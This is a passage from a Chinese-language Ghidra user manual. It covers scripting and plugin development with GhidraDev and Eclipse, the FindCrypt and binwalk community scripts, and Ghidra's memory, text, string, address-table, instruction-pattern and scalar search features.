基础</strong></p><p>在开始之前，我们建议在CodeBrowser当中选择Help→Ghidra API Help来阅读Ghidra API的官方文档。</p><p>当一个Ghidra插件脚本运行时，当前程序的状态会被处理为五个对象：</p><p>1 currentProgram：活跃的程序。</p><p>2 currentAddress：工具中当前光标位置的地址。</p><p>3 currentLocation：工具中当前光标位置的程序位置，如果无程序位置存在，则为NULL。</p><p>4 currentSelection：工具中当前的选择，如果无选择存在，则为NULL。</p><p>5 currentHighlight：工具中当前的高亮显示，如果无高亮显示存在，则为NULL。</p><p>Ghidra基于Java编写，而其插件可以用Java或是Jython进行编写。</p><p><strong>6.3.2 脚本编写</strong></p><p>我们将先对编写脚本进行介绍。</p><p>基于以上的基本了解，我们现在打开脚本管理器，Window→Script Manager。我们在此用ghidra_<a href="basics.py">basics.py</a>文件来做示例。右键并选择Edit with Basic Editor，我们便可以使用Ghidra提供的基本编辑器将其打开。</p><p> <img src="blob:file:///d219b049-af8b-486c-9427-668203be254a" alt="202004031448_Z83AQF4KXR5JWNW.png"></p><p>图6-5 ghidra_<a href="basics.py">basics.py</a></p><p>我们可以看到，该文件中介绍了一系列Ghidra API的使用方法。</p><p>接下来我们可以尝试创建一个新的脚本。点击Create New Script <img src="blob:file:///f55d742d-ed42-4129-9fbd-9e82bb3d14a6" alt="202004031448_VFXZUPYXNFQ2FZH.png">图标，并选择使用Java或是Python，选择文件路径与名称。</p><p> <img src="blob:file:///9f51545a-9e22-4723-a914-f7b818f76b74" alt="202004031449_DG4QEX5YHWDBQAD.png"></p><p>图6-6 新创建的Python脚本</p><p>一个编辑器将会弹出。我们可以在相应位置输入该脚本的元数据。标签内容如下：</p><p>@author: 说明脚本作者。</p><p>@category: 指示脚本目录路径。目录被用.符号分级。比如：</p><p>   @category categoryA.categoryB</p><p>@keybinding: 该标签指示激活该脚本的键位绑定。格式为ctrl alt shift A-Z,0-9,F1-F12。比如：</p><p>   @keybinding ctrl shift A</p><p>   @keybinding ctrl alt F12</p><p>@menupath: 指示该脚本在顶部菜单中的路径。路径层级用.区分。比如：</p><p>   @menupath <a href="File.Run.My">File.Run.My</a> Script</p><p>@toolbar: 工具栏中将创建一个用于启动该脚本的按键，该标签指定了该按键的图标。脚本管理器会尝试在脚本目录与Ghidra安装目录下搜索该图像，如果该图像不存在，会使用默认的图标。比如：</p><p>   @toolbar myScriptImage.gif</p><p>接下来我们会编写一个简单的Python脚本，</p><p><img src="blob:file:///7f97146d-e78d-48ac-8bea-1a1f9a82b628" alt="202004031449_2Q2F5TGT4ZSX2WN.png"></p><p>图6-7 简单的Python脚本</p><p>此处，我们使用getName()获取当前程序的名称，并使用popup()将字符串在弹出窗口中显示。更多的API请参考Ghidra API的官方文档，通过Help→Ghidra API Help打开。保存该脚本并运行，可以看到：</p><p> <img src="blob:file:///db8d3e6d-857f-4403-b50c-1f95e77cd6d4" alt="202004031449_YFUACT3SMDA2UR6.png"></p><p>图6-8 弹出窗口</p><p>如果使用print，则输出会显示于CodeBrowser中的控制台界面内。</p><p><strong>使用Eclipse</strong></p><p>如果想要高效地开发真正实用、更加复杂的Ghidra脚本或是插件，我们需要用到GhidraDev Eclipse插件。该插件提供Ghidra与Eclipse间的交互。</p><p>我们在脚本管理器当中右键点击一个脚本，并选择Edit with Eclipse，如果是第一次打开，我们会被要求输入Eclipse的安装目录。</p><p> <img src="blob:file:///4714e620-91c6-4f6a-84db-f981d55b0cc5" alt="202004031450_R2STE9B9PQ3UZ3F.png"></p><p>图6-9 设置Eclipse路径</p><p>如上图，勾选Automatically Install GhidraDev以自动安装GhidraDev插件。GhidraDev插件以及其文档位于&lt;Ghidra安装目录&gt;&#x2F;Extensions&#x2F;Eclipse&#x2F;GhidraDev&#x2F;。</p><p><img src="blob:file:///bb5dd84f-51a6-44bd-ad47-5074cae623cb" alt="202004031450_DRX75SDHU4S5H2T.png"></p><p>图6-10 创建项目</p><p>我们在弹出的窗口当中进行进一步的设置，点击Finish完成设置。</p><p>我们便可以在Eclipse当中对脚本进行编辑。需要注意的是，我们只应当在Ghidra的脚本管理器当中运行脚本，而不应该从Eclipse中运行。</p><p>我们同样可以在Eclipse当中对脚本进行调试。</p><p>1 将目前打开的Ghidra关闭。</p><p>2 点击Eclipse中的Debug As…图标 <img src="blob:file:///9d4e475f-e022-423e-b297-c807db25da21" alt="202004031451_5ZS47MGNDS9CYCG.png">，并选择Ghidra。</p><p>3 仍然从Ghidra的脚本管理器中运行脚本。</p><p>我们同样可以在Eclipse中使用Python来编写Ghidra插件，开始之前我们需要安装Eclipse上的PyDev插件。</p><p><strong>6.3.3 插件开发</strong></p><p>在非常多的情况下，编写脚本并从脚本管理器当中运行便能够满足我们的需求。但有时我们可能需要一个更加直观且完整的插件以供我们制作一个新的工具。GhidraDev支持对于插件的开发，我们在安装并设置好了的GhidraDev（见6.3.2）当中，选择GhidraDev→New→Ghidra Module Project，并创建一个项目。</p><p><img src="blob:file:///943dafdd-d8c5-4211-9566-5d692ca18d44" alt="202004031451_4WFEHHNKEP5BW2V.png"></p><p>图6-11 创建项目</p><p>可以看到，该新创建的扩展项目含有以下内容。</p><p> <img src="blob:file:///d8c8718d-f865-4123-beb0-0ed117f0437a" alt="202004031452_N4MPJX9GVAP9XQS.png"></p><p>图6-12 文件内容</p><p>src&#x2F;main&#x2F;java</p><p>src&#x2F;main&#x2F;resources</p><p>这两个文件夹包含了该扩展项目的Java源代码。</p><p>src&#x2F;main&#x2F;help</p><p>该文件夹存放对于该扩展的在线帮助内容，包括CSS与HTML文件。</p><p>ghidra_scripts&#x2F;</p><p>存放该扩展的脚本。</p><p>data&#x2F;</p><p>存放该扩展的数据文件。</p><p>lib&#x2F;</p><p>存放该扩展的外部Java依赖。如果不存在外部的依赖，我们可以将该目录删除。</p><p><strong>示例</strong></p><p>接下来我们将开发一个简单的Ghidra插件作为示例。更加详尽的内容请参考Ghidra的API文档。我们选中</p><p>src&#x2F;main&#x2F;java&#x2F;myproject&#x2F;MyProjectPlugin.java</p><p>我们在此对自定义插件的内容进行修改。</p><p> <img src="blob:file:///661398ae-3c61-4a54-ac9c-7ab8d8f7e324" alt="202004031452_PX43D6EYGDD8QXZ.png"></p><p>图6-13 插件描述</p><p>之后我们对窗口中的组件进行简单的修改。</p><p><img src="blob:file:///117132cc-d6b0-4738-be89-2cdfe7f2f34a" alt="202004031452_H95NEFUPYMYBZPE.png"></p><p>图6-14 窗口组件</p><p>接下来我们可以像对脚本进行调试一样，对该插件模组进行调试。确保没有正在运行的Ghidra后, 点击 <img src="blob:file:///9d4e475f-e022-423e-b297-c807db25da21" alt="202004031451_5ZS47MGNDS9CYCG.png">图标。</p><p>进入Ghidra的工具中后，点击File→Configure，在Experimental类别中，勾选上我们新编写的插件，之后在Window中，将该插件打开。</p><p><img src="blob:file:///14f3a8af-999f-4baa-9876-e305f1891ffd" alt="202004031453_8YJJ4B45FD3DQ3D.png"></p><p>图6-15 勾选该插件</p><p><img src="blob:file:///5fede103-2144-4d90-aa33-dd1b9b0d9327" alt="202004031453_E8XCWU9VCZPKZTD.png"></p><p>图6-16 打开插件</p><p>可以看到我们的插件窗口。当然这只是一个简单的示例，想要开发能够满足自己特定需求的插件，我们可以参考Ghidra的API文档，而更为直观的例子，我们可以从开源项目的（访问Github官网，并搜索Ghidra找到Ghidra的开源项目)</p><p>&#x2F;tree&#x2F;master&#x2F;Ghidra&#x2F;Extensions&#x2F;sample&#x2F;src&#x2F;main&#x2F;java&#x2F;ghidra&#x2F;examples</p><p>文件夹当中找到。</p><p><em>eclipse 实在是太老了，可能之后有人会开发其他方式的</em></p><p>#ghidra使用手册</p><p><strong>6.4 扩展实例</strong></p><p>开源社区已经为Ghidra编写了不少实用的脚本或是插件，接下来我们将对其中几个进行介绍。</p><p><strong>6.4.1 FindCrypt-Ghidra</strong></p><p>IDA中比较著名的插件，FindCrypt，为Ilfak Guilfanov（IDA Pro 的主要开发者之一）本人编写，用于快速的查找目标当中的加密函数引用，在逆向工程的领域尤其有用。</p><p>而该插件被开发者d3v1l401移植到了Ghidra当中，将其编写成了一个Ghidra脚本，我们可以访问Github官网，并搜索FindCrpyt-Ghidra以找到该项目。</p><p><strong>安装</strong></p><p>Windows：</p><p><em>1 将</em><a href="FindCrypt.java"><em>FindCrypt.java</em></a><em>移动到</em></p><p><em>&lt;Ghidra安装目录&gt;GhidraFeaturesBytePatternsghidra_scripts</em></p><p><em>2 将findcrypt_ghidra（该脚本的数据库目录）移动到</em></p><p><em>C:Users我们的用户</em></p><p><em>3 确保Ghidra拥有对于findcrypt_ghidra目录的读写权限。</em></p><p>Linux：</p><p><em>1 将</em><a href="FindCrypt.java"><em>FindCrypt.java</em></a><em>移动到</em></p><p><em>&lt;Ghidra安装目录&gt;&#x2F;Ghidra&#x2F;Features&#x2F;BytePatterns&#x2F;ghidra_scripts</em></p><p><em>2 将findcrypt_ghidra（该脚本的数据库目录）移动到~&#x2F;</em></p><p><em>3 确保Ghidra拥有对于findcrypt_ghidra目录的读写权限。</em></p><p><strong>使用</strong></p><p>我们打开脚本管理器，搜索<a href="FindCrypt.java">FindCrypt.java</a>，并运行该脚本。</p><p><img src="blob:file:///1ca0e258-0040-43bb-b351-51626c3e16b7" alt="202004031455_TEKF7D79A396NX3.png"></p><p>图6-17 运行结果</p><p>该插件将运行结果输出在了一个弹出窗口当中。</p><p><strong>6.4.2 binwalk</strong></p><p>同样来自于开源社区的<a href="binwalk.py">binwalk.py</a>脚本，允许我们在Ghidra中对当前程序运行binwalk工具，并将运行结果标记于陈列窗口中。该脚本的代码只有39行。我们可以访问Github官网，并搜索创作者为ghidraninja，名称为ghidra_scripts的开源项目。并找到其中的&#x2F;blob&#x2F;master&#x2F;binwalk.py文件。</p><p><img src="blob:file:///175a3266-ff2c-48ca-aaa1-d74868975082" alt="202004031455_QZ5CYAYTS9D9FFR.png"></p><p>图6-18 binwalk</p><p>我们需要提前确保binwalk位于$PATH当中。</p><p>#ghidra使用手册</p><p><strong>7.1 搜索</strong></p><p>在之前的章节当中，我们对于各个插件进行了单独的介绍。在这一章当中，我们会介绍如何在一个程序当中进行搜索与导向。</p><p>Ghidra提供了一系列的搜索功能。搜索程序内存功能能让我们在程序内存中快速的寻找字节样式。搜索程序文本功能可以在陈列窗口的不同部分，如注释、标签、助记符中搜索字符串。搜索字符串功能则可以搜索程序内存当中潜在的ASCII字符串。</p><p><strong>7.1.1 搜索内存</strong></p><p>搜索内存（Search Memory）功能在程序内存定位字节。该搜索基于输入的值，该值可以为十六进制、十进制或是字符串。对于字符串的搜索同样支持使用正则表达式。</p><p>1 在工具中，选择Search→Memory，这将打开如下的窗口。</p><p><img src="blob:file:///1d55e3b9-9a8c-4f80-870b-e3aaae809498" alt="202004031457_5V3MGKVTZNDD9HV.png"></p><p>图7-1 搜索内存</p><p>1 选择输入值的格式，并输入值。</p><p>2 选择Next寻找下一个出现的搜索值，选择Previous寻找上一个，或是选择Search All寻找全部。</p><p><strong>搜索格式</strong></p><p><strong>Hex 十六进制:</strong></p><p>输入的值为一串十六进制数。我们可以用.或是?来匹配任意的单个十六进制位。</p><p><strong>String 字符串：</strong></p><p> <img src="blob:file:///f9cc4f69-93fd-48f4-9ea4-1799313cf8e9" alt="202004031458_JB6NFKCCGDATXJJ.png"></p><p>图7-2 字符串格式</p><p>我们可以在Format Options处选择指定的编码，启用或者禁用大小写敏感。同时我们可以通过勾选Escape Sequences选项来允许转义字符出现于搜索值当中，比如n。</p><p><strong>Decimal 十进制：</strong></p><p><img src="blob:file:///b0f5445e-fee6-4597-978d-aefdab70759e" alt="202004031458_9BVN79TE68MSKU4.png"></p><p>图7-3 十进制</p><p>我们在靠中间的面板中选择该十进制数的格式：</p><p>Byte：定点的8位数字，即一个字节（-128 ~ 255）。</p><p>Word：定点的16位数字（-32768 ~ 65535）。</p><p>DWord：定点的32位数字。</p><p>QWord：定点的64位数字。</p><p>Float：浮点32位数字。</p><p>Double：浮点64位数字。</p><p>我们只能够输入满足该格式的十进制数字。</p><p><strong>Binary 二进制</strong></p><p>输入的值为一串二进制数。我们可以用x、?或是.来代表任意的单个二进制位。</p><p><strong>Regular Expression 正则表达式</strong></p><p>输入值会被解释为Java正则表达式，并将所有的内存视为一个字符串来进行匹配。使用正则表达式时，我们只能进行向前匹配。</p><p><strong>内存区块类型</strong></p><p>我们可以选择想要进行搜索的内存区块。Ghidra会将来自于程序的文件头中的额外信息储存于特别的内存区块当中，这些区块不位于当前程序的地址空间当中。</p><p>Loaded Blocks：选择该选项以只搜索已经加载的内存区块（将会在实际的该程序运行实例当中出现的内存区块）。</p><p>All Blocks：将会搜索所有的内存区块。</p><p><strong>选择范围</strong></p><p>Search All：选择该选项以在所有内存中搜索。</p><p>Search Selection：当该选项被选择时，搜索范围将被限制于工具中当前的选择内容，只有当我们在工具中作出了选择时，该选项才可用。</p><p><strong>代码单元范围</strong></p><p>点击Advanced&gt;&gt;展开高级选项，便能看到该区域（Code Unit Scope）。</p><p>Instructions：搜索指令。</p><p>Defined Data：搜索定义的数据。</p><p>Undefined Data：搜索未定义的数据。</p><p><strong>7.1.2 搜索程序文本</strong></p><p>搜索程序文本（Search for Program Text）功能允许我们对函数、注释、标签、指令以及定义的数据当中的文本字符串进行搜索。我们可以一个接一个地进行搜索，也可以生成一个搜索结果的列表。选择Search→Program Text以打开该窗口。</p><p><img src="blob:file:///4732bcb5-8928-4404-b174-1eecc2ddead3" alt="202004031459_7AHEYVZUP8JTYDU.png"></p><p>图7-4 搜索文本</p><p>我们可以在输入栏中输入我们想要搜索的字符串，类似地，我们可以使用?代表任意单个字符，并用<em>代表任意字符。需要注意的是，该输入区域不支持正则表达式的使用。如果我们想要搜索</em>或是?，则需要使用符号对其进行转义，比如说：*</p><p>此外，可以看到，窗口中有以下这些选项。</p><p><strong>搜索类型</strong></p><p>我们可以看到搜索类型（Search Type）区域有两个可选选项：Program Database Search与Listing Display Search。</p><p>Program Database Search选项在该程序数据库当中进行搜索。而Listing Display Search选项则在我们于陈列窗口所看到的东西当中进行搜索。他们会生成不同的结果，因为陈列窗口包含了派生的以及自动生成的信息，而这些信息不存在于数据库当中。数据库也可以包含不显示于陈列窗口当中的信息。以下的表格总结了它们的优缺点。</p><p> |Program Database Search| Listing Display Search</p><p>优点| 更快；可以得到不在陈列窗口显示的信息。| 搜索的结果反映我们在陈列窗口中可见的信息；包括派生和自动生成的信息都可以被搜索，而这些信息不处于数据库中。</p><p>缺点 | 搜索结果可能与陈列窗口中显示的内容不匹配；搜索也被限制于指定的区域。| 可能比数据库搜索要慢非常多。比如说，当我们在一个含有一个注释的大程序中进行搜索，数据库搜索可以立即找到该注释，而陈列窗口搜索在找到该注释前，需要遍历每一个地址；不能找到未显示于陈列窗口的信息。</p><p>默认的情况下，数据库搜索会被选中。</p><p><strong>渐进式搜索</strong></p><p>我们可以渐进地进行搜索：</p><p>点击Next或是Previous来向前或是向后进行搜索，搜索的起始点为我们在陈列窗口中的当前位置。</p><p>如果找到一个匹配，陈列窗口中当前的位置会被移动到匹配出现的位置。如果未找到匹配，将会出现Not found提醒。</p><p><img src="blob:file:///f6412645-f429-446b-847a-50682e323765" alt="202004031459_FMDWM48WB8XVXRB.png"></p><p>图7-5 未找到匹配</p><p>在一个大的程序中进行搜索可能会花一些时间，我们随时可以点击位于搜索进度栏右侧的Cancel图标，来停止进行中的搜索。</p><p><img src="blob:file:///025f17f8-1789-449d-a10e-cfd4c1b9c302" alt="202004031459_ATQ7H7NS7MFCAFG.png"></p><p>图7-6 取消搜索</p><p><strong>搜索全部</strong></p><p>除了进行渐进式地搜索，我们也可以寻找程序（或是选中内容）当中的所有匹配。点击Search All按键，这将弹出一个显示所有匹配的表格。</p><p><img src="blob:file:///bbf711ab-67f5-4804-ac42-7ec94049bf9d" alt="202004031500_Z2FCAKHJFTKPAC5.png"></p><p>图7-7 搜索全部</p><p>当在一个比较大的程序上进行该操作时，结果的表格将先于搜索完成弹出，而表格会随着搜索的进度而更新。类似地，我们也可以取消搜索，取消后，已经得到的匹配结果将仍显示于表格当中。</p><p>需要注意的是，我们可能得到同一个地址的多个入口。比如，在一个注释当中，一个字符串可能出现多次。当我们在结果表格中点击一行时，我们在陈列窗口当中的光标会被移动至相应位置。</p><p><strong>其他设置</strong></p><p>搜索全部功能存在预设的匹配数量上限，默认值为500。在找到500个匹配值后，搜索将会自动停止。我们可以匹配数量上限值：</p><p>1 在工具中选择Edit→Tool Options…，并找到其中Search栏。</p><p><img src="blob:file:///6cb63dda-9a4b-4e9d-87a8-491eededb267" alt="202004031500_ZBX8BK832EPU6XK.png"></p><p>图7-8 搜索设置选项</p><p>2 如图，在其中Search Limit栏，输入匹配数量上限。</p><p>3 点击OK或Apply。</p><p>类似地，在该面板中，我们也可以对搜索结果的高亮显示做出自定义。该处的设置同样应用于7.1.1当中的搜索内存功能。</p><p><strong>默认的搜索顺序</strong></p><p>该功能中，默认的搜索顺序如下：</p><p>1 函数</p><p>2 区块注释</p><p>3 前置注释</p><p>4 标签</p><p>5 指令助记符</p><p>6 指令操作数</p><p>7 定义的数据助记符</p><p>8 定义的数据值</p><p>9 行末注释</p><p>10 可重复注释</p><p>11 后置注释</p><p>而在一个函数当中，顺序如下：</p><p>1 函数注释</p><p>2 函数签名</p><p>3 栈变量类型</p><p>4 栈变量名称</p><p>5 栈变量便宜</p><p>6 栈变量注释</p><p>需要注意的是，即便我们更改了陈列窗口中的显示顺序，搜索顺序也不会改变，这可能导致我们在进行渐进式的搜索时，光标会进行前后的移动，而不是预期的，只向搜索的方向进行移动。</p><p><strong>7.1.3 搜索字符串</strong></p><p>搜索字符串（Search for Strings）功能在当前程序或是指定的选中内容中搜索可能的ASCII或Unicode字符串。结果将被展示于一个表格当中。</p><p>在工具当中选择Search→For String…以打开搜索字符串的对话窗口。</p><p><img src="blob:file:///ec60bd57-c74c-4a97-9180-6f484988a748" alt="202004031500_WQZNUPP5UEM7XKS.png"></p><p>图7-9 搜索字符串</p><p>如图，我们可以按需对以下选项做出修改（选择）。</p><p>Minimum Length：决定将显示字符串的最小长度。</p><p>Alignment：搜索将只返回从输入的对齐值开始的结果。</p><p>Require Null Termination：勾选时，搜索返回的字符串一定要以Null(&#96;&#96;)结尾；未勾选时，则无特定要求。</p><p>Pascal Strings：勾选时，只搜索有效的pascal, pascal 255，或是pascal unicode字符串。</p><p>Word Model：指定用于检测可能的单词的字符串分析模型文件。默认的文件为StringModel.sng。搜索结果表格中将会显示一列Is Word，以指示该字符串是否为单词。我们可以将该栏留空以将其忽略。而用户定义的分析模型文件应当被放置于Ghidra&#x2F;Features&#x2F;Base&#x2F;data&#x2F;stringngrams目录下。</p><p>Memory Block Types：指定搜索加载的内存区块或是全部内存区块。</p><p>Selection Scope：指定在整个地址空间中进行搜索，或是在当前用户选中的内容中进行搜索。</p><p><strong>搜索结果</strong></p><p>按需设置好这些选项后，我们按下Search，搜索的结果将会以一个表格的形式弹出。</p><p><img src="blob:file:///b9af46db-7237-45a6-baba-2f6d47fe4702" alt="202004031500_3ZK74TPV8B6TTW5.png"></p><p>图7-10 字符串搜索结果</p><p>结果中的列如下：</p><p>Defined：指示该字符串的状态。我们可以将光标移动到图标上查看图标所代表的状态。</p><p>Location：字符串所处地址。</p><p>Label：字符串所处位置的标签。</p><p>String View：显示该字符串。</p><p>String Type：显示该字符串类型。Ghidra支持ASCII字符串，Unicode字符串，pascal字符串，pascal 255字符串与pascal unicode字符串。</p><p>Length：字符串中的字符个数。</p><p>Is Word：当我们在选项中选择了一个单词分析模型时，该列会显示。指示该字符串是否为单词或是一串单词。</p><p><strong>创建字符串</strong></p><p>我们可以通过表格中的Make String来创建字符串。选中表格中的一行或多行，并按需修改以下选项。</p><p><img src="blob:file:///a56627cd-08aa-4801-aded-2495f3d1a335" alt="202004031501_M7JTN97R3PNDTEB.png"></p><p>图7-11 创建字符串</p><p>Offset：允许用户指定该字符串或是字符列表的起始点。对于pascal字符串，该选项会被忽略，因为更改偏移会让pascal字符串无效。</p><p>Auto Label：当勾选时，创建字符串时一个标签将被自动生成。</p><p>Include Alignment Nulls：当勾选时，创建的字符串会包含用于对齐的Null值。</p><p>Truncate if Needed：勾选时，如果存在冲突，创建截断的字符串。</p><p>按需设置好选项后，我们可以按下</p><p>Make String：在所选地址创建字符串。</p><p>Make Char Array：在所选地址创建一个字符的数组。</p><p><strong>7.1.4 搜索地址表</strong></p><p>搜索地址表（Search for Address Tables）功能搜索当前程序中可能的地址表。搜索结果将会被显示以一个列表的形式显示。</p><p>在工具中选择Search→For Address Tables…选项以搜索地址表。</p><p><img src="blob:file:///cbe5bf81-c145-4005-9ab3-591a1fe96f15" alt="202004031501_V9WDJRWS92PQRH4.png"></p><p>图7-12 搜索地址表</p><p>搜索选项如下：</p><p>Search Selection：显示搜索范围于陈列窗口中当前的选中内容（只有在陈列窗口中做出选择后，该勾选框才可选）。</p><p>Minimum Length：决定显示的地址表的最小长度。</p><p>Alignment：地址表必须按给定的字节对齐。</p><p>Skip Length：在匹配的地址间跳过的字节数。</p><p>按需设置好各个选项后，我们便可以按下Search以开始寻找。类似地，我们可以按下进度栏右侧的Cancel图标来终止搜索。</p><p><strong>搜索结果</strong></p><p>搜索的结果当中含有如下的列：</p><p>Location：地址表的位置。</p><p>Label：地址表所处位置的主要标签。</p><p>Data(Hex&#x2F;Ascii)：表中第一个元素指向的字节的ASCII与十六进制显示。</p><p>Length：地址表的长度。</p><p><strong>创建地址表</strong></p><p>我们同样可以在该窗口当中创建地址表。</p><p>1 在表格当中选择一行或多行。</p><p>2 勾选Auto Label选项可以在创建地址表时自动创建标签。</p><p>3 如必要的话，我们可以在offset输入栏处输入偏移：</p><p><img src="blob:file:///f829efe2-d78f-480e-a83d-e4e750c21c17" alt="202004031501_SCN239WKEJXBVPV.png"></p><p>图7-13 输入偏移值</p><p>   对于单个地址表，输入的偏移不能大于地址表长度减一。</p><p>   对于多个地址表，偏移值不能大于其中最小的地址表长度减一。</p><p>   输入栏右侧显示了经过调整（即算上了偏移值）的起始地址。当我们选中多个地址表时，此处无显示。</p><p>1 点击Make Table按键。</p><p>2 一个地址表将会创建于我们所选的位置，包含指向创建的地址的定义地址。</p><p><strong>反汇编地址表</strong></p><p>1 选中一行或多行。</p><p>2 点击Disassemble按键。</p><p><strong>7.1.5 搜索直接引用</strong></p><p>搜索直接引用（Search for Direct References）功能可以在整个程序当中搜索可能的对当前位置的直接引用。该搜索会尝试寻找组成当前位置地址的字节。搜索的结果也将显示于一个表格当中。</p><p><img src="blob:file:///9e38c90f-b63b-463f-ab79-6642ea40b04d" alt="202004031501_NFSC4SH6YNACSH5.png"></p><p>图7-14 搜索直接引用</p><p>我们可以通过以下操作搜索直接引用：</p><p>1 在陈列窗口当中点击一个地址。</p><p>2 选择Search→for Direct References…。</p><p>3 这将弹出显示搜索结果的表格窗口。</p><p>如果我们选择了一段地址并搜索直接引用，那么该功能将会搜索对于所有选中地址的可能的引用。我们可以通过Ctrl+A选中程序中所有内容，再进行搜索，以搜索程序内存空间中所有可能的引用。</p><p>显示结果的表格中有以下的列：</p><p>From Location：直接引用的地址。</p><p>Label：引用所在位置的主要标签。</p><p>From Preview：显示引用位置的代码单元定义。</p><p>To Location：被引用位置的地址。</p><p>To Preview：显示被引用位置的代码单元的定义。</p><p><strong>基于对齐值的过滤</strong></p><p><img src="blob:file:///68ca5d4f-0800-402d-b0d2-4013b1f0be4d" alt="202004031502_RJVD3MG4NTZDB5Q.png"></p><p>图7-15 对齐值过滤</p><p>当我们得到搜索结果后，我们可以对引用位置进行基于对齐值的过滤。如上图所示，我们可以选择1&#x2F;2&#x2F;4或8作为想要的对齐值。只有满足所选对齐值的结果才会显示于表格之中。</p><p><strong>7.1.6 指令样式搜索</strong></p><p>我们可以使用指令样式搜索（Instruction Pattern Search）功能搜索当前程序中的指定指令。</p><p>使用该功能的操作如下：</p><p>1 在陈列窗口中选择一段地址（不能选择多段地址）。</p><p>2 选择 Search→For Instruction Patterns…。</p><p>3 这将打开用于搜索指令样式搜索的对话窗口。</p><p><img src="blob:file:///093d0de1-20cf-4a2e-a350-8d251b9063af" alt="202004031502_AXHYFEEWQMZDCY8.png"></p><p>图7-16 指令样式搜索</p><p>我们可以看到，该窗口分为两个大部分：指令表与预览表。前者包含所有用户选中的指令，而后者显示了用于搜索的字符串。</p><p><strong>指令表</strong></p><p>该部分位于窗口左侧。</p><p><img src="blob:file:///e86c6024-cc4f-4551-841b-dfc45f39a7a5" alt="202004031502_6X3HJ6V33NDDGYT.png"></p><p>图7-17 指令表</p><p>所有选中范围内的内容，即便是非指令，都会显示于该表格当中。指令表上方有一行工具栏。我们可以点击一个方格来将其遮盖。</p><p>该样式可以涵盖的指令个数上限为500个。</p><p> <img src="blob:file:///9454d3f3-b86f-42d6-9f7d-fb32b5f180de" alt="202004031502_UDET4KGXXPBH4NK.png"></p><p>图7-18 指令表工具栏</p><p>从左到右这些图标的作用分别为：</p><p>1 清除所有遮盖。</p><p>2 遮盖所有数据（非指令）。</p><p>3 遮盖所有操作数。</p><p>4 遮盖所有标量操作数。</p><p>5 遮盖所有地址操作数。</p><p>6 根据陈列窗口中的选择内容刷新表格。</p><p>7 允许用户手动输入要加载的字节。</p><p>8 在陈列窗口中导航至这些指令的位置。</p><p><strong>预览表</strong></p><p><img src="blob:file:///0df42c41-01fd-49fd-833e-f3fa9b5795f3" alt="202004031503_NQJXC6JQBABNQY3.png"></p><p>图7-19 预览表</p><p>预览表会显示用于搜索的字符串是什么样子，当我们在指令表当中应用或移除遮盖时，预览表其中的内容会动态地进行对应变化。</p><p>当预览表以二进制显示时，遮盖的位会以.显示。</p><p>以十六进制显示时，如果字节的某些部分含有遮盖的位，那么十六进制值将不会显示。而是会显示其二进制值，其中遮盖的位同样以.表示。比如图中的。</p><p>在预览表的工具栏当中，</p><p> <img src="blob:file:///e87d360d-d7b3-429c-a8fd-aa11fe859130" alt="202004031503_VY43F4QQK4UGVZA.png"></p><p>图7-20 预览表工具栏</p><p>从左到右的图标作用分别为：</p><p>1 切换至二进制显示模式。</p><p>2 切换至十六进制显示模式。</p><p>3 将当前的预览表内容复制到剪切板当中。</p><p>我们可以将预览表中内容复制并保存，以便以后使用。</p><p><strong>搜索范围</strong></p><p>与其他搜索功能类似地，我们可以选择:</p><p>Entire Program: 在整个程序中进行搜索。</p><p>Search Selection: 在当前陈列窗口的选中内容中进行搜索。</p><p>Forward: 向前搜索。</p><p>Backward: 向后搜索。</p><p><strong>搜索结果</strong></p><p>配置好以上选项后，我们可以点击Search All按键以显示所有的匹配。如果点击Search，不会有结果表格弹出，但陈列窗口中光标将会移动至下一个匹配的位置。</p><p><img src="blob:file:///06275063-b049-46db-ad20-e01e7e914f8d" alt="202004031503_H3CVXUUA9VMY685.png"></p><p>图7-21 Search All显示所有搜索结果</p><p>需要注意的是，该搜索会寻找完全一样的字节样式。比如，当我们在一个程序中复制了其RET指令的样式，该样式在其他程序中很可能无法用于有效地搜索RET指令。</p><p>尽管如此，我们也能够根据自己的需求在多个程序当中使用该搜索功能。我们可以在程序A的陈列窗口中做出选择，并切换到开启程序B的工具中，选择该功能。</p><p><strong>7.1.7 搜索标量</strong></p><p>搜索标量（Search for Scalars）功能可以定位当前程序中的标量操作数或标量值。该搜索基于输入的十六进制或是十进制值。</p><p>1 在工具中选择Search→For Scalars。这将弹出如下的窗口。</p><p><img src="blob:file:///a6b9771f-0ce0-496e-a6b8-13e2441891e7" alt="202004031503_2HKDRA9E6TNUSEJ.png"></p><p>图7-22 搜索标量</p><p>1 可以看到其中的选项有：</p><p>  Scalars in Range：在程序中搜索值居于给定范围内的标量。</p><p>  Specific Scalar：在程序中搜索给定值的标量。</p><p>  Search All：搜索程序中所有内存。</p><p>  Search Selection：在工具内当前选中的内容当中进行搜索。</p><p>1 我们可以输入十进制或是十六进制数（0x…）。</p><p>2 点击Search以开始搜索。</p><p><strong>搜索结果</strong></p><p>搜索的结果将被呈现于一个表当中。如之前介绍过的，我们也可以从Window→Scalar Table处直接打开标量表。对其中的内容我们不再重复进行介绍。</p><p><img src="blob:file:///91b90a57-f196-48a6-b3e1-d16674a5cefc" alt="202004031504_XX7GMHYJ92MXU8M.png"></p><p>图7-23 搜索标量结果</p><p>#ghidra使用手册</p><p><strong>7.2 导向</strong></p><p>我们在使用Ghidra时，经常会有导向至程序中特定位置的需求，而Ghidra也提供了多种不同的导向方法。其中一种在陈列窗口中进行导向的方式我们已经于2.1.2当中进行过介绍。</p><p><strong>7.2.1 Go To</strong></p><p>Go To功能可以帮助我们导航至某个地址、标签、表达式。</p><p>1 在工具中选择Navigation→Go To…，或是使用快捷键G。</p><p>2 这将弹出一个窗口。</p><p> <img src="blob:file:///6c074e68-38bb-4c4f-a02a-b2475cced529" alt="202004031505_PG3GU5XSH5PX4ER.png"></p><p>图7-24 Go To窗口</p><p>3 我们可以在其中输入地址、标签、或是表达式，并选择OK。</p><p>4 如果该地址、标签、或是表达式有效，CodeBrowser将被重定位至那个位置。</p><p>5 如无效，该对话窗口将显示一个错误信息。</p><p> <img src="blob:file:///2143d30d-16b0-47c9-ae05-1fdc9ef8f438" alt="202004031505_M6Z7X8FZQUENEN3.png"></p><p>图7-25 